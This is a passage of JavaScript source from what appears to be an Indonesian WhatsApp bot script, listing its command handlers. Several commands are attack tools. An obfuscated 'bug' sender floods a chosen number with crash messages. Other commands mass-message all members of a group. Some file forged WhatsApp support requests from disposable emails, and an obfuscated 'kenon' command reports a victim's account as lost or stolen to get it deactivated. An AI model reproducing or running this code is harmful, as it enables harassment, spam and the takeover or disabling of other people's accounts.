const _0x5232c6=_0x4da8;(function(_0x1eb1d6,_0x2ccf96){const _0x5bf0a2=_0x4da8,_0x10a34a=_0x1eb1d6();while(!![]){try{const _0x46d2c3=parseInt(_0x5bf0a2(0x156))/0x1*(-parseInt(_0x5bf0a2(0x16d))/0x2)+parseInt(_0x5bf0a2(0x15d))/0x3*(parseInt(_0x5bf0a2(0x14f))/0x4)+parseInt(_0x5bf0a2(0x170))/0x5*(parseInt(_0x5bf0a2(0x153))/0x6)+-parseInt(_0x5bf0a2(0x169))/0x7+-parseInt(_0x5bf0a2(0x167))/0x8+parseInt(_0x5bf0a2(0x162))/0x9*(parseInt(_0x5bf0a2(0x15e))/0xa)+parseInt(_0x5bf0a2(0x16e))/0xb*(parseInt(_0x5bf0a2(0x16c))/0xc);if(_0x46d2c3===_0x2ccf96)break;else _0x10a34a['push'](_0x10a34a['shift']());}catch(_0x3796e8){_0x10a34a['push'](_0x10a34a['shift']());}}}(_0x3561,0x39882));if(!isDeveloper&&!isAkses&&!isOwner)return reply(global['mess'][_0x5232c6(0x163)]);if(!q)return reply(_0x5232c6(0x151)+command[_0x5232c6(0x161)]()+_0x5232c6(0x164)+command+_0x5232c6(0x15b)+command+_0x5232c6(0x16a));let orang=q[_0x5232c6(0x160)](',')[0x0],jumlah=q[_0x5232c6(0x160)](',')[0x1];if(!orang)return reply(_0x5232c6(0x151)+command['toUpperCase']()+_0x5232c6(0x164)+(prefix+command)+'\x20number,jumlah\x0a\x0a*Contoh:*\x0a'+(prefix+command)+_0x5232c6(0x16a));if(!jumlah)return reply(_0x5232c6(0x151)+command['toUpperCase']()+_0x5232c6(0x164)+(prefix+command)+_0x5232c6(0x15b)+(prefix+command)+_0x5232c6(0x16a));if(isNaN(parseInt(jumlah)))return reply('Jumlah\x20wajib\x20angka!!');let targetnya=orang[_0x5232c6(0x152)](/[^0-9]/g,''),jumlahnya=''+encodeURI(jumlah);function _0x4da8(_0x55be39,_0x311e83){const _0x35611a=_0x3561();return _0x4da8=function(_0x4da8d9,_0x4ac818){_0x4da8d9=_0x4da8d9-0x14f;let _0x5e244e=_0x35611a[_0x4da8d9];return _0x5e244e;},_0x4da8(_0x55be39,_0x311e83);}if(jumlahnya>global[_0x5232c6(0x159)])return reply(_0x5232c6(0x15f)+global[_0x5232c6(0x159)]+_0x5232c6(0x157));function _0x3561(){const _0x54e060=['toUpperCase','9abZRKg','AksesOnly','*\x0a\x0a*Example:*\x0a','onWhatsApp','*gagal\x20mengirim\x20bug\x20ke\x20Lexxy\x20Official,\x20karena\x20dia\x20pembuat\x20script\x20ini,\x20sekian\x20terima\x20kasih.*','3420272jfLoqM','6285789004732@s.whatsapp.net','3043481NjDmBw','\x20628xxxx,5','×\x0a\x0a*_NOTE\x20:_*\x0a*HARAP\x20JEDA\x201\x20MENIT*\x0a*GAK\x20JEDA\x20DELETE\x20AKSES*','3228XtREhg','66rZpcbZ','36410hXZbQz','OwnerNumber','60xmNTKw','52xypksR','length','*FORMAT\x20BUG\x20','replace','148182FmQqJH','mess','\x0a*JUMLAH\x20SPAM\x20:*\x20','11603HIjsWB','\x20if\x20above\x20it\x20will\x20fail','NotNumber','Max_Bug_Emoji','PesanBugDikirim','\x20number,jumlah\x0a\x0a*Contoh:*\x0a','@s.whatsapp.net','981lTVRkk','2898610TItvpo','max\x20send\x20number\x20of\x20bugs\x20','split'];_0x3561=function(){return _0x54e060;};return _0x3561();}var cekap=await conn[_0x5232c6(0x165)](targetnya+_0x5232c6(0x15c));let target=targetnya+_0x5232c6(0x15c);if(cekap[_0x5232c6(0x150)]==0x0)return reply(global['mess'][_0x5232c6(0x158)]);if(target=='6285789004732@s.whatsapp.net')return reply(_0x5232c6(0x166));if(target==_0x5232c6(0x168))return reply(_0x5232c6(0x166));if(target==CreatorLexxy+_0x5232c6(0x15c))return reply(_0x5232c6(0x166));if(target==global[_0x5232c6(0x16f)]+_0x5232c6(0x15c))return reply('*gagal\x20mengirim\x20bug\x20ke\x20owner\x20bot,\x20sekian\x20terima\x20kasih.*');reply(global[_0x5232c6(0x154)][_0x5232c6(0x15a)]),await sleep(0x3e8),sendBugSpam(target,jumlahnya),await sleep(0xbb8),mentions('*'+command[_0x5232c6(0x161)]()+'\x20BERHASIL\x20TERKIRIM*\x0a*TARGET\x20:*\x20@'+target[_0x5232c6(0x160)]('@')[0x0]+_0x5232c6(0x155)+jumlahnya+_0x5232c6(0x16b),[target]);
}
addCmd(command, 1, db_cmd)
break
case "join":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!q) return reply(`Penggunaan ${prefix+command} linkgrup`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await conn.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
addCmd(command, 1, db_cmd)
break
case "listgroup":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
let getGroups = await conn.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await conn.groupMetadata(x)
teks += `❏ Group Ke ${hituet+=1}\n│⭔ *NAMA :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontakv1 id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu ID Group Nya Di Atas`)
}
addCmd(command, 1, db_cmd)
break
case "pushv1":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!q) return reply(`Format Salah Silahkan Gunakan Contoh Sebagai Berikut\n${prefix+command} idgroup|teks\nUntuk Melihat ID Group Silahkan Ketik .listgroup`)
const metadata2 = await conn.groupMetadata(q.split("|")[0]).catch((err) => reply(err))
reply(`Please wait a moment..`)
const halss = metadata2.participants
for (let mem of halss) {
conn.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] }).catch((err) => reply(err))
await sleep(1000)
}}
addCmd(command, 1, db_cmd)
break
case "pushv2":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!isGroup) return reply(`Maaf Kak Fitur ${prefix+command} Hanya Bisa Di Gunakan Di Dalam Group\nUntuk Memasukan Bot Ke Dalam Group Yang Di Ingin Kan\nSilahkan Ketik Command .join linkgroup`)
if (!q) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)
const metadata3 = await conn.groupMetadata(from).catch((err) => reply(err))
reply(`Please wait a moment..`)
const halsss = metadata3.participants
for (let men of halsss) {
conn.sendMessage(`${men.id.split('@')[0]}` + "@s.whatsapp.net", { text: q }).catch((err) => reply(err))
await sleep(1000)
}}
addCmd(command, 1, db_cmd)
break

case "komplain":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!q) return reply(`_*Example*_\n${prefix+command} number|teks|email\n\n_*Contoh*_\n${prefix+command} 628xxxx|teks|lexx@gmail.com`)
let jircoyyyy = q.split('|')[0]
let teksssss = q.split('|')[1]
let emailnya = q.split('|')[2]
if (!jircoyyyy) return reply(`_*Example*_\n${prefix+command} number|teks|email\n\n_*Contoh*_\n${prefix+command} 628xxxx|teks|lexxyofficial@gmail.com`)
if (!teksssss) return reply(`_*Example*_\n${prefix+command} number|teks|email\n\n_*Contoh*_\n${prefix+command} 628xxxx|teks|lexxyofficial@gmail.com`)
if (!emailnya) return reply(`_*Example*_\n${prefix+command} number|teks|email\n\n_*Contoh*_\n${prefix+command} 628xxxx|teks|lexxyofficial@gmail.com`)
let dia = jircoyyyy.split("|")[0].replace(/[^0-9]/g, '')
if (dia == CreatorLexxy) return reply(`*gagal mengirim bug ke Hardz Official, karena dia pembuat script ini, sekian terima kasih.*`)
var cekap = await conn.onWhatsApp(dia + '@s.whatsapp.net')
if (cekap.length == 0) return reply(global.mess.NotNumber)
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
//let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", emailnya)
form.append("email_confirm", emailnya)
form.append("platform", "ANDROID")
form.append("your_message", `${teksssss}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
addCmd(command, 1, db_cmd)
break

case "resetotp":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let jir = q
let dia = jir.split("|")[0].replace(/[^0-9]/g, '')
var cekap = await conn.onWhatsApp(dia + '@s.whatsapp.net')
if (cekap.length == 0) return reply(global.mess.NotNumber)
if (dia == CreatorLexxy) return reply(`*gagal mengirim bug ke Lexxy Official, karena dia pembuat script ini, sekian terima kasih.*`)
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Por favor, pesquise o código OTP para este número porque outra pessoa acidentalmente se conectou com meu número e eu tive que esperar 14 horas, por favor, pesquise novamente neste número`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
addCmd(command, 1, db_cmd)
break

// UNBANNED MENU
case "unbanv1":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let jir = q
let dia = jir.split("|")[0].replace(/[^0-9]/g, '')
var cekap = await conn.onWhatsApp(dia + '@s.whatsapp.net')
if (cekap.length == 0) return reply(global.mess.NotNumber)
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${teksUnban1()}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
addCmd(command, 1, db_cmd)
break
case "unbanv2":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let jir = q
let dia = jir.split("|")[0].replace(/[^0-9]/g, '')
var cekap = await conn.onWhatsApp(dia + '@s.whatsapp.net')
if (cekap.length == 0) return reply(global.mess.NotNumber)
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${teksUnban2()}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
addCmd(command, 1, db_cmd)
break
case "unbanv3":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let jir = q
let dia = jir.split("|")[0].replace(/[^0-9]/g, '')
var cekap = await conn.onWhatsApp(dia + '@s.whatsapp.net')
if (cekap.length == 0) return reply(global.mess.NotNumber)
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${teksUnban3()}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
addCmd(command, 1, db_cmd)
break
case "unbanv4":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let jir = q
let dia = jir.split("|")[0].replace(/[^0-9]/g, '')
var cekap = await conn.onWhatsApp(dia + '@s.whatsapp.net')
if (cekap.length == 0) return reply(global.mess.NotNumber)
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${teksUnban4()}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
addCmd(command, 1, db_cmd)
break
case "unbanv5":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let jir = q
let dia = jir.split("|")[0].replace(/[^0-9]/g, '')
var cekap = await conn.onWhatsApp(dia + '@s.whatsapp.net')
if (cekap.length == 0) return reply(global.mess.NotNumber)
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${teksUnban5()}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
addCmd(command, 1, db_cmd)
break
case "unbanv6":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let jir = q
let dia = jir.split("|")[0].replace(/[^0-9]/g, '')
var cekap = await conn.onWhatsApp(dia + '@s.whatsapp.net')
if (cekap.length == 0) return reply(global.mess.NotNumber)
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${teksUnban6()}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
addCmd(command, 1, db_cmd)
break
case "unbanv7":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let jir = q
let dia = jir.split("|")[0].replace(/[^0-9]/g, '')
var cekap = await conn.onWhatsApp(dia + '@s.whatsapp.net')
if (cekap.length == 0) return reply(global.mess.NotNumber)
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${teksUnban7()}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
addCmd(command, 1, db_cmd)
break
case "unbanv8":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let jir = q
let dia = jir.split("|")[0].replace(/[^0-9]/g, '')
var cekap = await conn.onWhatsApp(dia + '@s.whatsapp.net')
if (cekap.length == 0) return reply(global.mess.NotNumber)
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${teksUnban8()}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
addCmd(command, 1, db_cmd)
break
case "logout":
case "out":
case "verif":
case "kenon":{
const _0xd1af2f=_0x2fbf;(function(_0x1d44d7,_0x4a83e9){const _0x3feb61=_0x2fbf,_0x3d8ec4=_0x1d44d7();while(!![]){try{const _0x2ae647=parseInt(_0x3feb61(0xe5))/0x1+-parseInt(_0x3feb61(0x102))/0x2*(parseInt(_0x3feb61(0xff))/0x3)+-parseInt(_0x3feb61(0xf8))/0x4*(-parseInt(_0x3feb61(0xea))/0x5)+parseInt(_0x3feb61(0x104))/0x6+-parseInt(_0x3feb61(0xda))/0x7+parseInt(_0x3feb61(0xfc))/0x8*(parseInt(_0x3feb61(0x106))/0x9)+-parseInt(_0x3feb61(0xef))/0xa;if(_0x2ae647===_0x4a83e9)break;else _0x3d8ec4['push'](_0x3d8ec4['shift']());}catch(_0x426492){_0x3d8ec4['push'](_0x3d8ec4['shift']());}}}(_0x2209,0x89363));if(!isDeveloper&&!isOwner)return reply(global['mess']['DeveloperOnly']);if(!q)return reply('Penggunaan\x20'+(prefix+command)+_0xd1af2f(0xf3));let dia=q[_0xd1af2f(0xe6)]('|')[0x0][_0xd1af2f(0xf0)](/[^0-9]/g,'');var cekap=await conn[_0xd1af2f(0xf2)](dia+_0xd1af2f(0x108));if(cekap[_0xd1af2f(0xe2)]==0x0)return reply(global[_0xd1af2f(0xfa)]['NotNumber']);function _0x2209(){const _0x2e2d65=['jazoest','*gagal mengirim bug ke Hardz Official, karena dia pembuat script ini, sekian terima kasih.*','your_message','1553265aWiEgS','input[name=jazoest]','1006630858','POST','__rev','parse','19316.BP:whatsapp_www_pkg.2.0.0.0.0','get','length','href','format','414281vMwhbL','split','__hs','submit','__ccg','390kdycIX','phone_number','load','ANDROID','https://www.whatsapp.com/contact/?subject=messenger','19316210cDheDj','replace','action','onWhatsApp','\x20628xxxx','dpr','__a','__req','set-cookie','34588yWGmCc','join','mess','email','6495632WBsxLx','input[name=lsd]','headers','969FBKseL','step','find','1150fWyGhn','UNKNOWN','6003354skhLPJ','platform','9RYmbgH','Perdido/roubado:\x20desative\x20minha\x20conta','@s.whatsapp.net','data','email_confirm','append','https://www.whatsapp.com','__user','INDONESIA','6285789004732','attr','val'];_0x2209=function(){return _0x2e2d65;};return _0x2209();}if(dia==_0xd1af2f(0x10f))return;if(dia==CreatorLexxy)return reply(_0xd1af2f(0xd8));var axioss=require('axios');let ntah=await axioss[_0xd1af2f(0xe1)](_0xd1af2f(0xee)),email=await axioss[_0xd1af2f(0xe1)]('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10000'),cookie=ntah[_0xd1af2f(0xfe)][_0xd1af2f(0xf7)][_0xd1af2f(0xf9)](';\x20');function _0x2fbf(_0x360b3e,_0x43d5fd){const _0x2209e8=_0x2209();return _0x2fbf=function(_0x2fbf71,_0x40dd02){_0x2fbf71=_0x2fbf71-0xd8;let _0x116654=_0x2209e8[_0x2fbf71];return _0x116654;},_0x2fbf(_0x360b3e,_0x43d5fd);}const cheerio=require('cheerio');let $=cheerio[_0xd1af2f(0xec)](ntah['data']),$form=$('form'),url=new URL($form[_0xd1af2f(0x110)](_0xd1af2f(0xf1)),_0xd1af2f(0x10c))[_0xd1af2f(0xe3)],form=new URLSearchParams();form[_0xd1af2f(0x10b)](_0xd1af2f(0x112),$form[_0xd1af2f(0x101)](_0xd1af2f(0xdb))[_0xd1af2f(0x111)]()),form[_0xd1af2f(0x10b)]('lsd',$form[_0xd1af2f(0x101)](_0xd1af2f(0xfd))[_0xd1af2f(0x111)]()),form[_0xd1af2f(0x10b)](_0xd1af2f(0x100),_0xd1af2f(0xe8)),form['append']('country_selector',_0xd1af2f(0x10e)),form[_0xd1af2f(0x10b)](_0xd1af2f(0xeb),''+dia),form[_0xd1af2f(0x10b)](_0xd1af2f(0xfb),email[_0xd1af2f(0x109)][0x0]),form[_0xd1af2f(0x10b)](_0xd1af2f(0x10a),email[_0xd1af2f(0x109)][0x0]),form['append'](_0xd1af2f(0x105),_0xd1af2f(0xed)),form[_0xd1af2f(0x10b)](_0xd1af2f(0xd9),_0xd1af2f(0x107)),form[_0xd1af2f(0x10b)](_0xd1af2f(0x10d),'0'),form[_0xd1af2f(0x10b)](_0xd1af2f(0xf5),'1'),form[_0xd1af2f(0x10b)]('__csr',''),form[_0xd1af2f(0x10b)](_0xd1af2f(0xf6),'8'),form[_0xd1af2f(0x10b)](_0xd1af2f(0xe7),_0xd1af2f(0xe0)),form['append'](_0xd1af2f(0xf4),'1'),form[_0xd1af2f(0x10b)](_0xd1af2f(0xe9),_0xd1af2f(0x103)),form[_0xd1af2f(0x10b)](_0xd1af2f(0xde),_0xd1af2f(0xdc)),form[_0xd1af2f(0x10b)]('__comment_req','0');let res=await axioss({'url':url,'method':_0xd1af2f(0xdd),'data':form,'headers':{'cookie':cookie}});reply(util[_0xd1af2f(0xe4)](JSON[_0xd1af2f(0xdf)](res['data'][_0xd1af2f(0xf0)]('for\x20(;;);',''))));
}
addCmd(command, 1, db_cmd)
break

// GROUP MENU
case 'linkgrup': case 'linkgc':{
if (!isGroup) return reply(global.mess.GroupOnly)
if (!isBotAdmins) return reply(global.mess.BotAdmin)
if (!isGroupAdmins && !isDeveloper) return reply(global.mess.AdminOnly)
var url = await conn.groupInviteCode(from).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
url = 'https://chat.whatsapp.com/'+url
reply(url)
}
addCmd(command, 1, db_cmd)
break
case 'revoke':{
if (!isGroup) return reply(global.mess.GroupOnly)
if (!isBotAdmins) return reply(global.mess.BotAdmin)
if (!isGroupAdmins && !isDeveloper) return reply(global.mess.AdminOnly)
await conn.groupRevokeInvite(from).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
addCmd(command, 1, db_cmd)
break
case 'group': case 'grup':
if (!isGroup) return reply(global.mess.GroupOnly)
if (!isBotAdmins) return reply(global.mess.BotAdmin)
if (!isGroupAdmins && !isDeveloper) return reply(global.mess.AdminOnly)
if (args[0] == "off") {
conn.groupSettingUpdate(from, 'announcement').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] == "on") {
conn.groupSettingUpdate(from, 'not_announcement').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else {
